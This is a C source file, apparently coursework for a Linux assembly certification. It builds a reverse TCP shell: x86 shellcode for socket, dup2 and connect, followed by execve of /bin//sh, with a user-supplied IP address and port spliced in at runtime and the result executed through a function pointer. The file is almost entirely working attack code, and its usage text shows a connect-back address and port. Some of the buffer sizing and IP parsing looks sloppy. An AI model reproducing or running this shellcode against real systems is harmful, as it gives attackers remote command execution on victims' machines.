/*
This code has been created for completing the requirements of the SecurityTube Linux Assembly Expertcertification:
  	
   http://securitytube-­training.com/online-courses/securitytube-linux-assembly-expert/  

Student ID: SLAE-1537
*/
#include<stdio.h>
#include<string.h>
#include<stdlib.h>

unsigned char codePart1[] = \
"\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x01\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x89\xf3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\xb3\x03\x31\xc9\x68";

unsigned char codePart2[] = \
"\x66\x68";

unsigned char codePart3[] = \
"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc0\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80";

int main(int argc, const char * argv[])
{

	if(argc < 3)
	{
		printf("Usage: \n");
	        printf("./reverse-tcp-shell ip-address port-number\n");
		printf("Example:\n");
		printf("./reverse-tcp-shell 192.168.31.145 4444\n");
        	return 0;
	}

	const char * ipAddress = argv[1];
	const char * portNumber = argv[2];
	int one, two, three, four, flag1=1, flag2=1, flag3=1, flag4=1;
	char ipAdrs[4];
	int i = 0;

	//split the enterd ip address
	for(int j = 0; j < strlen(ipAddress); j++){

		if(*(ipAddress+j) == '.' && flag1 ){
			ipAdrs[i] = '\0';
			one = atoi(ipAdrs);
			flag1 = i = 0;
			continue;

		}else if (*(ipAddress+j) == '.' && flag2){
			ipAdrs[i] = '\0';
			two = atoi(ipAdrs);
			flag2 = i = 0;
			continue;
			
		}else if (*(ipAddress+j) == '.' && flag3){
			ipAdrs[i] = '\0';
			three = atoi(ipAdrs);
			flag3 = i = 0;
			
			continue;
			
		}else if (j == strlen(ipAddress)-1){
			ipAdrs[i++] = *(ipAddress+j);
			ipAdrs[i] = '\0';
			four = atoi(ipAdrs);
			flag4 = i = 0;
			continue;
			
		}else{
			ipAdrs[i++] = *(ipAddress+j);

		}

	}	


	ipAdrs[i] = '\0';

	int size = strlen(portNumber);

	int portInt = atoi(portNumber);
	
	char* portHex = (char*) malloc(size*4*sizeof(char));

	sprintf(portHex, "%02x", portInt);

	unsigned char* executable = (char*) malloc(strlen(codePart1) + strlen(codePart2) + strlen(codePart2) + 4 + strlen(portHex) * sizeof(char));
	memset (executable,0,strlen(codePart1) + strlen(codePart2) + strlen(portHex) * sizeof(char));
	unsigned char* helper = executable;
	
	//add the first part of the shellcode to the executable pointer
	for(int j = 0; j < strlen(codePart1); j++){

		*(helper++) = codePart1[j];
	}
	
	//write the splitted ip address into a file, to read it back as binary hex
	FILE * f = fopen ("tmp.txt","wb");
	fwrite(&one, 1, sizeof(int)/2, f);
	fwrite(&two, 1, sizeof(int)/2, f);
	fwrite(&three, 1, sizeof(int)/2, f);
	fwrite(&four, 1, sizeof(int)/2, f);

	fclose(f);

	//read back the ip address into the executable pointer
	f = fopen ("tmp.txt","rb");
	for(int i = 0; i < 4; i++){
		fread(helper++,1,2,f);
	}
	
	fclose (f);

	//add the second part of the shellcode to the executable pointer
	for(int j = 0; j < strlen(codePart2); j++){

		*(helper++) = codePart2[j];
	}


	//write the ip address to a file to read it back as binary hex
	f = fopen ("tmp.txt","wb");
	fwrite(&portInt, 1, sizeof(int), f);

	fflush(f);
	fclose(f);

	//read back the port as binary hex
	f = fopen ("tmp.txt","rb");
	fread(helper++,1,4,f);
	helper+=1;
	fclose (f);
	
	//reverse the read port
	unsigned char tmp = *(helper-2);
	*(helper-2) = *(helper-1);
	*(helper-1) = tmp;

	
	//add the third part of the shellcode to the executable pointer
	for(int j = 0; j < strlen(codePart3); j++){

		*(helper++) = codePart3[j];
	}

	//make a function pointer to the executable pointer
	int (*ret)() = (int(*)())executable;

	//call executable
	ret();

	return 0;

}

	
